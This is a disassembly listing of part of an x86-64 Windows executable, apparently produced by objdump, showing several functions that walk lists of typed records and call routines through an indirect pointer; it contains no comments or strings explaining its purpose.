   140002d92:	e9 6b 01 00 00       	jmp    0x140002f02
   140002d97:	48 89 9c 24 98 10 00 	mov    %rbx,0x1098(%rsp)
   140002d9e:	00 
   140002d9f:	48 8b 9e 08 10 00 00 	mov    0x1008(%rsi),%rbx
   140002da6:	48 89 ac 24 a0 10 00 	mov    %rbp,0x10a0(%rsp)
   140002dad:	00 
   140002dae:	48 89 bc 24 a8 10 00 	mov    %rdi,0x10a8(%rsp)
   140002db5:	00 
   140002db6:	4c 89 b4 24 60 10 00 	mov    %r14,0x1060(%rsp)
   140002dbd:	00 
   140002dbe:	48 3b 9e 10 10 00 00 	cmp    0x1010(%rsi),%rbx
   140002dc5:	0f 83 15 01 00 00    	jae    0x140002ee0
   140002dcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002dd0:	80 7b 11 73          	cmpb   $0x73,0x11(%rbx)
   140002dd4:	0f 85 eb 00 00 00    	jne    0x140002ec5
   140002dda:	48 8b d3             	mov    %rbx,%rdx
   140002ddd:	48 8b ce             	mov    %rsi,%rcx
   140002de0:	e8 5b e6 ff ff       	call   0x140001440
   140002de5:	48 8b e8             	mov    %rax,%rbp
   140002de8:	48 85 c0             	test   %rax,%rax
   140002deb:	0f 84 78 02 00 00    	je     0x140003069
   140002df1:	4c 8d 73 12          	lea    0x12(%rbx),%r14
   140002df5:	ba 00 10 00 00       	mov    $0x1000,%edx
   140002dfa:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002dff:	4d 8d 8d 22 20 00 00 	lea    0x2022(%r13),%r9
   140002e06:	4c 8d 05 1b 90 02 00 	lea    0x2901b(%rip),%r8        # 0x14002be28
   140002e0d:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140002e14:	00 
   140002e15:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002e1a:	e8 d1 ed ff ff       	call   0x140001bf0
   140002e1f:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140002e24:	0f 8d 29 02 00 00    	jge    0x140003053
   140002e2a:	48 8b 05 7f 10 04 00 	mov    0x4107f(%rip),%rax        # 0x140043eb0
   140002e31:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002e36:	ff 15 24 86 02 00    	call   *0x28624(%rip)        # 0x14002b460
   140002e3c:	48 8d 15 25 90 02 00 	lea    0x29025(%rip),%rdx        # 0x14002be68
   140002e43:	49 8b cf             	mov    %r15,%rcx
   140002e46:	48 8b f8             	mov    %rax,%rdi
   140002e49:	4c 8b c0             	mov    %rax,%r8
   140002e4c:	48 8b 05 05 10 04 00 	mov    0x41005(%rip),%rax        # 0x140043e58
   140002e53:	ff 15 07 86 02 00    	call   *0x28607(%rip)        # 0x14002b460
   140002e59:	48 8b 05 08 0f 04 00 	mov    0x40f08(%rip),%rax        # 0x140043d68
   140002e60:	48 8b cf             	mov    %rdi,%rcx
   140002e63:	ff 15 f7 85 02 00    	call   *0x285f7(%rip)        # 0x14002b460
   140002e69:	8b 53 0c             	mov    0xc(%rbx),%edx
   140002e6c:	48 8b cd             	mov    %rbp,%rcx
   140002e6f:	48 8b 05 b2 0f 04 00 	mov    0x40fb2(%rip),%rax        # 0x140043e28
   140002e76:	ff 15 e4 85 02 00    	call   *0x285e4(%rip)        # 0x14002b460
   140002e7c:	48 8b cd             	mov    %rbp,%rcx
   140002e7f:	48 8b f8             	mov    %rax,%rdi
   140002e82:	e8 d5 12 01 00       	call   0x14001415c
   140002e87:	48 85 ff             	test   %rdi,%rdi
   140002e8a:	0f 84 9d 01 00 00    	je     0x14000302d
   140002e90:	48 8b 05 c1 0f 04 00 	mov    0x40fc1(%rip),%rax        # 0x140043e58
   140002e97:	48 8d 15 02 90 02 00 	lea    0x29002(%rip),%rdx        # 0x14002bea0
   140002e9e:	4c 8b c7             	mov    %rdi,%r8
   140002ea1:	49 8b cf             	mov    %r15,%rcx
   140002ea4:	ff 15 b6 85 02 00    	call   *0x285b6(%rip)        # 0x14002b460
   140002eaa:	48 8b 05 4f 0f 04 00 	mov    0x40f4f(%rip),%rax        # 0x140043e00
   140002eb1:	4d 8b c4             	mov    %r12,%r8
   140002eb4:	49 8b d4             	mov    %r12,%rdx
   140002eb7:	48 8b cf             	mov    %rdi,%rcx
   140002eba:	ff 15 a0 85 02 00    	call   *0x285a0(%rip)        # 0x14002b460
   140002ec0:	48 85 c0             	test   %rax,%rax
   140002ec3:	74 62                	je     0x140002f27
   140002ec5:	48 8b d3             	mov    %rbx,%rdx
   140002ec8:	48 8b ce             	mov    %rsi,%rcx
   140002ecb:	e8 10 ea ff ff       	call   0x1400018e0
   140002ed0:	48 8b d8             	mov    %rax,%rbx
   140002ed3:	48 3b 86 10 10 00 00 	cmp    0x1010(%rsi),%rax
   140002eda:	0f 82 f0 fe ff ff    	jb     0x140002dd0
   140002ee0:	33 c0                	xor    %eax,%eax
   140002ee2:	48 8b 9c 24 98 10 00 	mov    0x1098(%rsp),%rbx
   140002ee9:	00 
   140002eea:	48 8b bc 24 a8 10 00 	mov    0x10a8(%rsp),%rdi
   140002ef1:	00 
   140002ef2:	48 8b ac 24 a0 10 00 	mov    0x10a0(%rsp),%rbp
   140002ef9:	00 
   140002efa:	4c 8b b4 24 60 10 00 	mov    0x1060(%rsp),%r14
   140002f01:	00 
   140002f02:	4c 8b a4 24 68 10 00 	mov    0x1068(%rsp),%r12
   140002f09:	00 
   140002f0a:	48 8b 8c 24 50 10 00 	mov    0x1050(%rsp),%rcx
   140002f11:	00 
   140002f12:	48 33 cc             	xor    %rsp,%rcx
   140002f15:	e8 56 89 00 00       	call   0x14000b870
   140002f1a:	48 81 c4 70 10 00 00 	add    $0x1070,%rsp
   140002f21:	41 5f                	pop    %r15
   140002f23:	41 5d                	pop    %r13
   140002f25:	5e                   	pop    %rsi
   140002f26:	c3                   	ret
   140002f27:	48 8b 05 aa 0e 04 00 	mov    0x40eaa(%rip),%rax        # 0x140043dd8
   140002f2e:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140002f33:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002f38:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002f3d:	ff 15 1d 85 02 00    	call   *0x2851d(%rip)        # 0x14002b460
   140002f43:	48 8b 05 96 0e 04 00 	mov    0x40e96(%rip),%rax        # 0x140043de0
   140002f4a:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140002f4f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002f54:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002f59:	ff 15 01 85 02 00    	call   *0x28501(%rip)        # 0x14002b460
   140002f5f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002f64:	33 f6                	xor    %esi,%esi
   140002f66:	48 8b 05 f3 0e 04 00 	mov    0x40ef3(%rip),%rax        # 0x140043e60
   140002f6d:	ff 15 ed 84 02 00    	call   *0x284ed(%rip)        # 0x14002b460
   140002f73:	48 8b f8             	mov    %rax,%rdi
   140002f76:	48 8b c8             	mov    %rax,%rcx
   140002f79:	48 8b 05 10 0f 04 00 	mov    0x40f10(%rip),%rax        # 0x140043e90
   140002f80:	ff 15 da 84 02 00    	call   *0x284da(%rip)        # 0x14002b460
   140002f86:	48 85 c0             	test   %rax,%rax
   140002f89:	74 0b                	je     0x140002f96
   140002f8b:	48 8b c8             	mov    %rax,%rcx
   140002f8e:	e8 81 67 01 00       	call   0x140019714
   140002f93:	48 8b f0             	mov    %rax,%rsi
   140002f96:	48 8b 05 cb 0d 04 00 	mov    0x40dcb(%rip),%rax        # 0x140043d68
   140002f9d:	48 8b cf             	mov    %rdi,%rcx
   140002fa0:	ff 15 ba 84 02 00    	call   *0x284ba(%rip)        # 0x14002b460
   140002fa6:	41 80 bd 50 30 00 00 	cmpb   $0x0,0x3050(%r13)
   140002fad:	00 
   140002fae:	74 0e                	je     0x140002fbe
   140002fb0:	48 8d 0d f9 8e 02 00 	lea    0x28ef9(%rip),%rcx        # 0x14002beb0
   140002fb7:	e8 58 67 01 00       	call   0x140019714
   140002fbc:	eb 1a                	jmp    0x140002fd8
   140002fbe:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140002fc3:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140002fc9:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140002fce:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002fd3:	e8 18 fb ff ff       	call   0x140002af0
   140002fd8:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140002fdd:	48 8b f8             	mov    %rax,%rdi
   140002fe0:	48 8b 05 11 0e 04 00 	mov    0x40e11(%rip),%rax        # 0x140043df8
   140002fe7:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140002fec:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002ff1:	ff 15 69 84 02 00    	call   *0x28469(%rip)        # 0x14002b460
   140002ff7:	48 8b 05 f2 0d 04 00 	mov    0x40df2(%rip),%rax        # 0x140043df0
   140002ffe:	ff 15 5c 84 02 00    	call   *0x2845c(%rip)        # 0x14002b460
   140003004:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003008:	4c 8b c7             	mov    %rdi,%r8
   14000300b:	48 8b d6             	mov    %rsi,%rdx
   14000300e:	e8 5d f4 ff ff       	call   0x140002470
   140003013:	48 8b ce             	mov    %rsi,%rcx
   140003016:	e8 41 11 01 00       	call   0x14001415c
   14000301b:	48 8b cf             	mov    %rdi,%rcx
   14000301e:	e8 39 11 01 00       	call   0x14001415c
   140003023:	b8 01 00 00 00       	mov    $0x1,%eax
   140003028:	e9 b5 fe ff ff       	jmp    0x140002ee2
   14000302d:	49 8b d6             	mov    %r14,%rdx
   140003030:	48 8d 0d 41 8e 02 00 	lea    0x28e41(%rip),%rcx        # 0x14002be78
   140003037:	e8 b4 f5 ff ff       	call   0x1400025f0
   14000303c:	48 8b 05 ad 0d 04 00 	mov    0x40dad(%rip),%rax        # 0x140043df0
   140003043:	ff 15 17 84 02 00    	call   *0x28417(%rip)        # 0x14002b460
   140003049:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000304e:	e9 8f fe ff ff       	jmp    0x140002ee2
   140003053:	48 8d 0d de 8d 02 00 	lea    0x28dde(%rip),%rcx        # 0x14002be38
   14000305a:	e8 91 f5 ff ff       	call   0x1400025f0
   14000305f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003064:	e9 79 fe ff ff       	jmp    0x140002ee2
   140003069:	48 8d 0d 90 8d 02 00 	lea    0x28d90(%rip),%rcx        # 0x14002be00
   140003070:	e8 7b f5 ff ff       	call   0x1400025f0
   140003075:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000307a:	e9 63 fe ff ff       	jmp    0x140002ee2
   14000307f:	cc                   	int3
   140003080:	40 53                	rex push %rbx
   140003082:	48 83 ec 20          	sub    $0x20,%rsp
   140003086:	48 8b d9             	mov    %rcx,%rbx
   140003089:	e8 62 2a 00 00       	call   0x140005af0
   14000308e:	85 c0                	test   %eax,%eax
   140003090:	75 38                	jne    0x1400030ca
   140003092:	48 8b cb             	mov    %rbx,%rcx
   140003095:	c6 83 30 30 00 00 01 	movb   $0x1,0x3030(%rbx)
   14000309c:	e8 df 2b 00 00       	call   0x140005c80
   1400030a1:	85 c0                	test   %eax,%eax
   1400030a3:	75 25                	jne    0x1400030ca
   1400030a5:	48 8b cb             	mov    %rbx,%rcx
   1400030a8:	e8 53 27 00 00       	call   0x140005800
   1400030ad:	85 c0                	test   %eax,%eax
   1400030af:	75 19                	jne    0x1400030ca
   1400030b1:	48 8b cb             	mov    %rbx,%rcx
   1400030b4:	e8 d7 28 00 00       	call   0x140005990
   1400030b9:	85 c0                	test   %eax,%eax
   1400030bb:	75 0d                	jne    0x1400030ca
   1400030bd:	48 8b cb             	mov    %rbx,%rcx
   1400030c0:	48 83 c4 20          	add    $0x20,%rsp
   1400030c4:	5b                   	pop    %rbx
   1400030c5:	e9 36 fc ff ff       	jmp    0x140002d00
   1400030ca:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400030cf:	48 83 c4 20          	add    $0x20,%rsp
   1400030d3:	5b                   	pop    %rbx
   1400030d4:	c3                   	ret
   1400030d5:	cc                   	int3
   1400030d6:	cc                   	int3
   1400030d7:	cc                   	int3
   1400030d8:	cc                   	int3
   1400030d9:	cc                   	int3
   1400030da:	cc                   	int3
   1400030db:	cc                   	int3
   1400030dc:	cc                   	int3
   1400030dd:	cc                   	int3
   1400030de:	cc                   	int3
   1400030df:	cc                   	int3
   1400030e0:	40 53                	rex push %rbx
   1400030e2:	41 56                	push   %r14
   1400030e4:	b8 f8 30 00 00       	mov    $0x30f8,%eax
   1400030e9:	e8 82 8a 00 00       	call   0x14000bb70
   1400030ee:	48 2b e0             	sub    %rax,%rsp
   1400030f1:	48 8b 05 48 af 03 00 	mov    0x3af48(%rip),%rax        # 0x14003e040
   1400030f8:	48 33 c4             	xor    %rsp,%rax
   1400030fb:	48 89 84 24 d0 30 00 	mov    %rax,0x30d0(%rsp)
   140003102:	00 
   140003103:	48 89 ac 24 18 31 00 	mov    %rbp,0x3118(%rsp)
   14000310a:	00 
   14000310b:	45 33 f6             	xor    %r14d,%r14d
   14000310e:	48 8b e9             	mov    %rcx,%rbp
   140003111:	48 89 bc 24 28 31 00 	mov    %rdi,0x3128(%rsp)
   140003118:	00 
   140003119:	4c 89 ac 24 e8 30 00 	mov    %r13,0x30e8(%rsp)
   140003120:	00 
   140003121:	33 d2                	xor    %edx,%edx
   140003123:	4c 8b a9 10 20 00 00 	mov    0x2010(%rcx),%r13
   14000312a:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   140003130:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003135:	41 8b de             	mov    %r14d,%ebx
   140003138:	e8 a3 66 02 00       	call   0x1400297e0
   14000313d:	49 8b bd 08 10 00 00 	mov    0x1008(%r13),%rdi
   140003144:	49 3b bd 10 10 00 00 	cmp    0x1010(%r13),%rdi
   14000314b:	0f 83 e8 01 00 00    	jae    0x140003339
   140003151:	4c 89 a4 24 f0 30 00 	mov    %r12,0x30f0(%rsp)
   140003158:	00 
   140003159:	41 bc ff ff ff ff    	mov    $0xffffffff,%r12d
   14000315f:	48 89 b4 24 20 31 00 	mov    %rsi,0x3120(%rsp)
   140003166:	00 
   140003167:	4c 89 bc 24 e0 30 00 	mov    %r15,0x30e0(%rsp)
   14000316e:	00 
   14000316f:	90                   	nop
   140003170:	0f b6 4f 11          	movzbl 0x11(%rdi),%ecx
   140003174:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140003177:	a8 f7                	test   $0xf7,%al
   140003179:	74 17                	je     0x140003192
   14000317b:	80 f9 64             	cmp    $0x64,%cl
   14000317e:	0f 84 02 01 00 00    	je     0x140003286
   140003184:	80 f9 6e             	cmp    $0x6e,%cl
   140003187:	74 09                	je     0x140003192
   140003189:	80 f9 78             	cmp    $0x78,%cl
   14000318c:	0f 85 3a 01 00 00    	jne    0x1400032cc
   140003192:	48 8d 77 12          	lea    0x12(%rdi),%rsi
   140003196:	85 db                	test   %ebx,%ebx
   140003198:	0f 85 83 01 00 00    	jne    0x140003321
   14000319e:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   1400031a5:	48 85 c9             	test   %rcx,%rcx
   1400031a8:	74 08                	je     0x1400031b2
   1400031aa:	48 8b d6             	mov    %rsi,%rdx
   1400031ad:	e8 1e 3c 00 00       	call   0x140006dd0
   1400031b2:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400031b7:	4c 8d 8d 22 20 00 00 	lea    0x2022(%rbp),%r9
   1400031be:	4c 8d 05 c3 8a 02 00 	lea    0x28ac3(%rip),%r8        # 0x14002bc88
   1400031c5:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400031cc:	00 
   1400031cd:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400031d2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400031d9:	00 
   1400031da:	e8 11 ea ff ff       	call   0x140001bf0
   1400031df:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400031e4:	0f 8d 28 01 00 00    	jge    0x140003312
   1400031ea:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400031f1:	00 
   1400031f2:	e8 19 0d 00 00       	call   0x140003f10
   1400031f7:	83 f8 01             	cmp    $0x1,%eax
   1400031fa:	75 3e                	jne    0x14000323a
   1400031fc:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   140003203:	48 85 c9             	test   %rcx,%rcx
   140003206:	74 11                	je     0x140003219
   140003208:	48 8b d6             	mov    %rsi,%rdx
   14000320b:	e8 d0 36 00 00       	call   0x1400068e0
   140003210:	83 f8 01             	cmp    $0x1,%eax
   140003213:	0f 84 b3 00 00 00    	je     0x1400032cc
   140003219:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   140003220:	00 
   140003221:	44 38 b5 31 30 00 00 	cmp    %r14b,0x3031(%rbp)
   140003228:	0f 85 bb 00 00 00    	jne    0x1400032e9
   14000322e:	48 8d 0d bb 8a 02 00 	lea    0x28abb(%rip),%rcx        # 0x14002bcf0
   140003235:	e8 36 f6 ff ff       	call   0x140002870
   14000323a:	4c 8b c6             	mov    %rsi,%r8
   14000323d:	48 8d 95 22 20 00 00 	lea    0x2022(%rbp),%rdx
   140003244:	48 8b cd             	mov    %rbp,%rcx
   140003247:	e8 e4 42 00 00       	call   0x140007530
   14000324c:	85 c0                	test   %eax,%eax
   14000324e:	0f 88 b5 00 00 00    	js     0x140003309
   140003254:	80 7f 11 64          	cmpb   $0x64,0x11(%rdi)
   140003258:	75 59                	jne    0x1400032b3
   14000325a:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   140003261:	00 
   140003262:	48 8b cd             	mov    %rbp,%rcx
   140003265:	4c 8d 8c 24 d0 10 00 	lea    0x10d0(%rsp),%r9
   14000326c:	00 
   14000326d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003272:	4c 8d 84 24 d0 20 00 	lea    0x20d0(%rsp),%r8
   140003279:	00 
   14000327a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000327f:	e8 bc 08 00 00       	call   0x140003b40
   140003284:	eb 40                	jmp    0x1400032c6
   140003286:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   14000328a:	48 8d 94 24 d0 10 00 	lea    0x10d0(%rsp),%rdx
   140003291:	00 
   140003292:	48 8d 8c 24 d0 20 00 	lea    0x20d0(%rsp),%rcx
   140003299:	00 
   14000329a:	e8 61 0b 00 00       	call   0x140003e00
   14000329f:	41 3b c4             	cmp    %r12d,%eax
   1400032a2:	48 8d b4 24 d0 10 00 	lea    0x10d0(%rsp),%rsi
   1400032a9:	00 
   1400032aa:	41 0f 44 dc          	cmove  %r12d,%ebx
   1400032ae:	e9 e3 fe ff ff       	jmp    0x140003196
   1400032b3:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   1400032ba:	00 
   1400032bb:	48 8b d7             	mov    %rdi,%rdx
   1400032be:	49 8b cd             	mov    %r13,%rcx
   1400032c1:	e8 fa e2 ff ff       	call   0x1400015c0
   1400032c6:	8b d8                	mov    %eax,%ebx
   1400032c8:	85 c0                	test   %eax,%eax
   1400032ca:	75 2b                	jne    0x1400032f7
   1400032cc:	48 8b d7             	mov    %rdi,%rdx
   1400032cf:	49 8b cd             	mov    %r13,%rcx
   1400032d2:	e8 09 e6 ff ff       	call   0x1400018e0
   1400032d7:	48 8b f8             	mov    %rax,%rdi
   1400032da:	49 3b 85 10 10 00 00 	cmp    0x1010(%r13),%rax
   1400032e1:	0f 82 89 fe ff ff    	jb     0x140003170
   1400032e7:	eb 38                	jmp    0x140003321
   1400032e9:	48 8d 0d d8 89 02 00 	lea    0x289d8(%rip),%rcx        # 0x14002bcc8
   1400032f0:	e8 fb f2 ff ff       	call   0x1400025f0
   1400032f5:	eb 27                	jmp    0x14000331e
   1400032f7:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400032fb:	48 8d 0d 56 8a 02 00 	lea    0x28a56(%rip),%rcx        # 0x14002bd58
   140003302:	e8 e9 f2 ff ff       	call   0x1400025f0
   140003307:	eb 18                	jmp    0x140003321
   140003309:	48 8d 0d 18 8a 02 00 	lea    0x28a18(%rip),%rcx        # 0x14002bd28
   140003310:	eb 07                	jmp    0x140003319
   140003312:	48 8d 0d 77 89 02 00 	lea    0x28977(%rip),%rcx        # 0x14002bc90
   140003319:	e8 d2 f2 ff ff       	call   0x1400025f0
   14000331e:	41 8b dc             	mov    %r12d,%ebx
   140003321:	48 8b b4 24 20 31 00 	mov    0x3120(%rsp),%rsi
   140003328:	00 
   140003329:	4c 8b bc 24 e0 30 00 	mov    0x30e0(%rsp),%r15
   140003330:	00 
   140003331:	4c 8b a4 24 f0 30 00 	mov    0x30f0(%rsp),%r12
   140003338:	00 
   140003339:	4c 8b ac 24 e8 30 00 	mov    0x30e8(%rsp),%r13
   140003340:	00 
   140003341:	48 8b bc 24 28 31 00 	mov    0x3128(%rsp),%rdi
   140003348:	00 
   140003349:	48 8b ac 24 18 31 00 	mov    0x3118(%rsp),%rbp
   140003350:	00 
   140003351:	4c 39 74 24 30       	cmp    %r14,0x30(%rsp)
   140003356:	74 24                	je     0x14000337c
   140003358:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000335d:	0f 1f 00             	nopl   (%rax)
   140003360:	48 8b c8             	mov    %rax,%rcx
   140003363:	e8 38 e5 ff ff       	call   0x1400018a0
   140003368:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000336d:	4d 8d 76 01          	lea    0x1(%r14),%r14
   140003371:	4a 83 3c f0 00       	cmpq   $0x0,(%rax,%r14,8)
   140003376:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   14000337a:	75 e4                	jne    0x140003360
   14000337c:	8b c3                	mov    %ebx,%eax
   14000337e:	48 8b 8c 24 d0 30 00 	mov    0x30d0(%rsp),%rcx
   140003385:	00 
   140003386:	48 33 cc             	xor    %rsp,%rcx
   140003389:	e8 e2 84 00 00       	call   0x14000b870
   14000338e:	48 81 c4 f8 30 00 00 	add    $0x30f8,%rsp
   140003395:	41 5e                	pop    %r14
   140003397:	5b                   	pop    %rbx
   140003398:	c3                   	ret
   140003399:	cc                   	int3
   14000339a:	cc                   	int3
   14000339b:	cc                   	int3
   14000339c:	cc                   	int3
   14000339d:	cc                   	int3
   14000339e:	cc                   	int3
   14000339f:	cc                   	int3
   1400033a0:	40 53                	rex push %rbx
   1400033a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400033a6:	48 8b d9             	mov    %rcx,%rbx
   1400033a9:	e8 12 24 00 00       	call   0x1400057c0
   1400033ae:	48 8b 8b 28 30 00 00 	mov    0x3028(%rbx),%rcx
   1400033b5:	48 85 c9             	test   %rcx,%rcx
   1400033b8:	74 10                	je     0x1400033ca
   1400033ba:	e8 c1 4d 00 00       	call   0x140008180
   1400033bf:	48 c7 83 28 30 00 00 	movq   $0x0,0x3028(%rbx)
   1400033c6:	00 00 00 00 
   1400033ca:	48 83 c4 20          	add    $0x20,%rsp
   1400033ce:	5b                   	pop    %rbx
   1400033cf:	c3                   	ret
   1400033d0:	c2 00 00             	ret    $0x0
   1400033d3:	cc                   	int3
   1400033d4:	cc                   	int3
   1400033d5:	cc                   	int3
   1400033d6:	cc                   	int3
   1400033d7:	cc                   	int3
   1400033d8:	cc                   	int3
   1400033d9:	cc                   	int3
   1400033da:	cc                   	int3
   1400033db:	cc                   	int3
   1400033dc:	cc                   	int3
   1400033dd:	cc                   	int3
   1400033de:	cc                   	int3
   1400033df:	cc                   	int3
   1400033e0:	40 53                	rex push %rbx
   1400033e2:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400033e7:	e8 84 87 00 00       	call   0x14000bb70
   1400033ec:	48 2b e0             	sub    %rax,%rsp
   1400033ef:	48 8b 05 4a ac 03 00 	mov    0x3ac4a(%rip),%rax        # 0x14003e040
   1400033f6:	48 33 c4             	xor    %rsp,%rax
   1400033f9:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   140003400:	00 
   140003401:	48 8b d9             	mov    %rcx,%rbx
   140003404:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003409:	33 c9                	xor    %ecx,%ecx
   14000340b:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003411:	ff 15 a9 7c 02 00    	call   *0x27ca9(%rip)        # 0x14002b0c0
   140003417:	85 c0                	test   %eax,%eax
   140003419:	75 1d                	jne    0x140003438
   14000341b:	48 8d 15 1e 8d 02 00 	lea    0x28d1e(%rip),%rdx        # 0x14002c140
   140003422:	48 8d 0d 5f 8d 02 00 	lea    0x28d5f(%rip),%rcx        # 0x14002c188
   140003429:	e8 b2 f5 ff ff       	call   0x1400029e0
   14000342e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003433:	e9 95 00 00 00       	jmp    0x1400034cd
   140003438:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000343d:	e8 5e 51 00 00       	call   0x1400085a0
   140003442:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003447:	85 c0                	test   %eax,%eax
   140003449:	74 5a                	je     0x1400034a5
   14000344b:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   140003452:	00 
   140003453:	e8 c8 51 00 00       	call   0x140008620
   140003458:	85 c0                	test   %eax,%eax
   14000345a:	79 18                	jns    0x140003474
   14000345c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003461:	48 8d 0d 48 8d 02 00 	lea    0x28d48(%rip),%rcx        # 0x14002c1b0
   140003468:	e8 53 f2 ff ff       	call   0x1400026c0
   14000346d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003472:	eb 59                	jmp    0x1400034cd
   140003474:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000347a:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   140003481:	00 
   140003482:	48 8d 0d 87 8d 02 00 	lea    0x28d87(%rip),%rcx        # 0x14002c210
   140003489:	e8 92 10 01 00       	call   0x140014520
   14000348e:	33 d2                	xor    %edx,%edx
   140003490:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003495:	85 c0                	test   %eax,%eax
   140003497:	48 8d 84 24 20 20 00 	lea    0x2020(%rsp),%rax
   14000349e:	00 
   14000349f:	0f 45 ca             	cmovne %edx,%ecx
   1400034a2:	48 03 c8             	add    %rax,%rcx
   1400034a5:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400034ab:	48 8b d3             	mov    %rbx,%rdx
   1400034ae:	e8 ad 52 00 00       	call   0x140008760
   1400034b3:	48 85 c0             	test   %rax,%rax
   1400034b6:	75 13                	jne    0x1400034cb
   1400034b8:	48 8d 0d 61 8d 02 00 	lea    0x28d61(%rip),%rcx        # 0x14002c220
   1400034bf:	e8 fc f1 ff ff       	call   0x1400026c0
   1400034c4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400034c9:	eb 02                	jmp    0x1400034cd
   1400034cb:	33 c0                	xor    %eax,%eax
   1400034cd:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400034d4:	00 
   1400034d5:	48 33 cc             	xor    %rsp,%rcx
   1400034d8:	e8 93 83 00 00       	call   0x14000b870
   1400034dd:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400034e4:	5b                   	pop    %rbx
   1400034e5:	c3                   	ret
   1400034e6:	cc                   	int3
   1400034e7:	cc                   	int3
   1400034e8:	cc                   	int3
   1400034e9:	cc                   	int3
   1400034ea:	cc                   	int3
   1400034eb:	cc                   	int3
   1400034ec:	cc                   	int3
   1400034ed:	cc                   	int3
   1400034ee:	cc                   	int3
   1400034ef:	cc                   	int3
   1400034f0:	40 56                	rex push %rsi
   1400034f2:	57                   	push   %rdi
   1400034f3:	41 56                	push   %r14
   1400034f5:	b8 70 20 00 00       	mov    $0x2070,%eax
   1400034fa:	e8 71 86 00 00       	call   0x14000bb70
   1400034ff:	48 2b e0             	sub    %rax,%rsp
   140003502:	48 8b 05 37 ab 03 00 	mov    0x3ab37(%rip),%rax        # 0x14003e040
   140003509:	48 33 c4             	xor    %rsp,%rax
   14000350c:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   140003513:	00 
   140003514:	48 8b f9             	mov    %rcx,%rdi
   140003517:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000351c:	e8 df 11 01 00       	call   0x140014700
   140003521:	48 8b c8             	mov    %rax,%rcx
   140003524:	33 d2                	xor    %edx,%edx
   140003526:	e8 69 12 01 00       	call   0x140014794
   14000352b:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   14000352f:	e8 ac fe ff ff       	call   0x1400033e0
   140003534:	85 c0                	test   %eax,%eax
   140003536:	79 0c                	jns    0x140003544
   140003538:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   14000353f:	e9 d6 01 00 00       	jmp    0x14000371a
   140003544:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003548:	48 89 9c 24 98 20 00 	mov    %rbx,0x2098(%rsp)
   14000354f:	00 
   140003550:	e8 9b e3 ff ff       	call   0x1400018f0
   140003555:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   14000355c:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
